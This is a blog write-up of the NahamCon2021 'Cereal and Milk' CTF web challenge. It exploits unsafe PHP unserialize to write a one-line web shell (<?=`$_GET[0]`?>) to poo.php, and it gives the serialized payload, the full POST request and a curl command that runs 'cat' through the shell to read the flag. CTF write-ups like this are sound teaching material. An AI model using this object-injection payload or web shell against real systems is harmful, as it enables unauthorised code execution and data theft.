<!doctype html><html lang=en>
<head>
<title>
NahamCon2021 CTF - Cereal and Milk ::
#!/bin/note
— a checkbox uncheckers notepad
</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="category web - medium
solution The challenge URL drops us on a page where we can submit cereals.
 We are also given two files to download, index.php &amp;amp; log.php. I quickly spotted an unsafe deserialisation bug in the provided files. The cleaned up and relevant PHP code from both files were:
index.php
&amp;lt;?php include &amp;#39;log.php&amp;#39;; class CerealAndMilk { public $logs = &amp;#34;request-logs.txt&amp;#34;; public $request = &amp;#39;&amp;#39;; public $cereal = &amp;#39;Captain Crunch&amp;#39;; public $milk = &amp;#39;&amp;#39;; public function processed_data($output) { echo &amp;#34;Deserilized data:&amp;lt;br&amp;gt; Coming soon.">
<meta name=keywords content="blog,hack,ctf,leonjza,pentester,red team,attack">
<meta name=robots content="noodp">
<link rel=canonical href=https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-cereal-and-milk/>
<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
<link rel=stylesheet href=https://leonjza.github.io/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary">
<meta name=twitter:title content="NahamCon2021 CTF - Cereal and Milk">
<meta name=twitter:description content="category web - medium
solution The challenge URL drops us on a page where we can submit cereals.
 We are also given two files to download, index.php & log.php. I quickly spotted an unsafe deserialisation bug in the provided files. The cleaned up and relevant PHP code from both files were:
index.php
<?php include 'log.php'; class CerealAndMilk { public $logs = &#34;request-logs.txt&#34;; public $request = ''; public $cereal = 'Captain Crunch'; public $milk = ''; public function processed_data($output) { echo &#34;Deserilized data:<br> Coming soon.">
<meta property="og:title" content="NahamCon2021 CTF - Cereal and Milk">
<meta property="og:description" content="category web - medium
solution The challenge URL drops us on a page where we can submit cereals.
 We are also given two files to download, index.php & log.php. I quickly spotted an unsafe deserialisation bug in the provided files. The cleaned up and relevant PHP code from both files were:
index.php
<?php include 'log.php'; class CerealAndMilk { public $logs = &#34;request-logs.txt&#34;; public $request = ''; public $cereal = 'Captain Crunch'; public $milk = ''; public function processed_data($output) { echo &#34;Deserilized data:<br> Coming soon.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-cereal-and-milk/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-03-15T10:42:54+02:00">
<meta property="article:modified_time" content="2021-03-15T10:42:54+02:00"><meta property="og:site_name" content="#!/bin/note
">
</head>
<body class=dark-theme>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/ class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>#!/bin/note
</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/about/>About Me</a></li>
<li><a href=/categories>Categories</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/about/>About Me</a></li>
<li><a href=/categories>Categories</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>NahamCon2021 CTF - Cereal and Milk</h1>
<div class=post-meta>
<span class=post-date>
2021-03-15
</span>
<span class=post-read-time>— 2 min read</span>
</div>
<div class=post-content>
<h2>Table of Contents</h2>
<aside class=table-of-contents><nav id=TableOfContents>
<ul>
<li>
<ul>
<li><a href=#category>category</a></li>
<li><a href=#solution>solution</a></li>
</ul>
</li>
</ul>
</nav></aside>
<h2 id=category>category</h2>
<p>web - medium</p>
<h2 id=solution>solution</h2>
<p>The challenge URL drops us on a page where we can submit cereals.</p>
<figure class=left>
<img src=/images/nahamcon/cereal_and_milk.png>
</figure>
<p>We are also given two files to download, <code>index.php</code> & <code>log.php</code>. I quickly spotted an unsafe deserialisation bug in the provided files. The cleaned up and relevant PHP code from both files were:</p>
<p><code>index.php</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>

<span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#39;log.php&#39;</span>;

<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CerealAndMilk</span>
{
    <span style=color:#66d9ef>public</span> $logs <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;request-logs.txt&#34;</span>;
    <span style=color:#66d9ef>public</span> $request <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
    <span style=color:#66d9ef>public</span> $cereal <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Captain Crunch&#39;</span>;
    <span style=color:#66d9ef>public</span> $milk <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;


    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>processed_data</span>($output)
    {
        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Deserilized data:&lt;br&gt; Coming soon.&#34;</span>;
        <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>print_r</span>($output);

    }

    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>cereal_and_milk</span>()
    {
     <span style=color:#66d9ef>echo</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cereal</span> <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34; is the best cereal btw.&#34;</span>;
    }

}

$input <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;serdata&#39;</span>];
$output <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($input);

$app <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>CerealAndMilk</span>;
$app <span style=color:#f92672>-&gt;</span> <span style=color:#a6e22e>cereal_and_milk</span>($output);
$app <span style=color:#f92672>-&gt;</span> <span style=color:#a6e22e>processed_data</span>($output);

<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></code></pre></div><p><code>log.php</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>

<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>log</span>
{
    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __destruct()
        {
            $request_log <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>logs</span> , <span style=color:#e6db74>&#34;a&#34;</span>);
            <span style=color:#a6e22e>fwrite</span>($request_log, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>request</span>);
            <span style=color:#a6e22e>fwrite</span>($request_log, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#34;</span>);
            <span style=color:#a6e22e>fclose</span>($request_log);
        }
}

<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></code></pre></div><p>The <code>index.php</code> file had a line that effectively does <code>unserialize($_POST['serdata'];)</code> on user input. The <code>log.php</code> file had a class, <code>log()</code> that had a <code>__destruct()</code> method, writing contents (<code>$this->request</code>) to a file (<code>$this->logs</code>). Both the <code>logs</code> and <code>request</code> properties can be controlled with an arbitrary serialized string.</p>
<p>All we needed was a malicious serialized string which we can easily generate by constructing a new <code>log()</code> class, setting properties and calling <code>serialize()</code> on it.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>log</span>
{

    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct()
    {
        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>logs</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;poo.php&#34;</span>;
        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>request</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&lt;?=`</span><span style=color:#ae81ff>\$</span><span style=color:#e6db74>_GET[0]`?&gt;&#34;</span>;
    }

    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __destruct()
        {
            $request_log <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>logs</span> , <span style=color:#e6db74>&#34;a&#34;</span>);
            <span style=color:#a6e22e>fwrite</span>($request_log, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>request</span>);
            <span style=color:#a6e22e>fwrite</span>($request_log, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#34;</span>);
            <span style=color:#a6e22e>fclose</span>($request_log);
        }
}

$l <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>log</span>();
$input <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>($l);
<span style=color:#66d9ef>echo</span> $input <span style=color:#f92672>.</span> <span style=color:#a6e22e>PHP_EOL</span>;
</code></pre></div><p>This should output the following line we can use as input to the <code>serdata</code> POST parameter:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>O:3:&#34;log&#34;:2:{s:4:&#34;logs&#34;;s:7:&#34;poo.php&#34;;s:7:&#34;request&#34;;s:15:&#34;&lt;?=`$_GET[0]`?&gt;&#34;;}
</code></pre></div><p>I could replicate this locally, but had trouble on the challenge service. I asked for some help from the folks over at <a href=https://hacksouth.africa/>HackSouth</a>, and after a bunch of debugging I realised their payloads used a <code>4</code> instead of the <code>2</code> for the number of properties in the class. I&rsquo;m still confused by this. Anyways. The updated payload that wrote my shell was:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>O:3:&#34;log&#34;:4:{s:4:&#34;logs&#34;;s:7:&#34;poo.php&#34;;s:7:&#34;request&#34;;s:15:&#34;&lt;?=`$_GET[0]`?&gt;&#34;;}
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-tex data-lang=tex>POST /index.php HTTP/1.1
Host: challenge.nahamcon.com:32469
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: http://challenge.nahamcon.com:32469
Connection: close
Referer: http://challenge.nahamcon.com:32469/index.php
Cookie: auth2=eyJpZCI6MX0.YEp7Wg.fHdsxIGEolHgYQD0d_cvExass8E; auth=eyJpZCI6MX0.YEp7Wg.fHdsxIGEolHgYQD0d_cvExass8E; 2passwordAuth=eyJpZCI6MX0.YE8cpg.H-KAOClMD0uq5M7ycSJMzLtOHoM
Upgrade-Insecure-Requests: 1

serdata=O:3:&#34;log&#34;:4:{s:4:&#34;logs&#34;;s:7:&#34;poo.php&#34;;s:7:&#34;request&#34;;s:15:&#34;&lt;?=`<span style=color:#e6db74>$</span>_GET<span style=color:#f92672>[</span><span style=color:#ae81ff>0</span><span style=color:#f92672>]</span>`?&gt;&#34;;}
</code></pre></div><p>Using the command exec I found the <code>ndwbr7pVKNCrhs-CerealnMilk/</code> folder that had the flag.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl <span style=color:#e6db74>&#34;http://challenge.nahamcon.com:32469/poo.php?0=cat%20ndwbr7pVKNCrhs-CerealnMilk/flag.txt&#34;</span>
flag<span style=color:#f92672>{</span>70385676892a2a813a666961ddd6f899<span style=color:#f92672>}</span>
</code></pre></div>
</div>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Read other posts</span>
<hr>
</div>
<div class=pagination__buttons>
<span class="button previous">
<a href=https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-bad-blog/>
<span class=button__icon>←</span>
<span class=button__text>NahamCon2021 CTF - Bad Blog</span>
</a>
</span>
<span class="button next">
<a href=https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-imposter/>
<span class=button__text>NahamCon2021 CTF - Imposter</span>
<span class=button__icon>→</span>
</a>
</span>
</div>
</div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
</div>
</footer>
<script src=https://leonjza.github.io/assets/main.js></script>
<script src=https://leonjza.github.io/assets/prism.js></script>
</div>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
</body>
</html>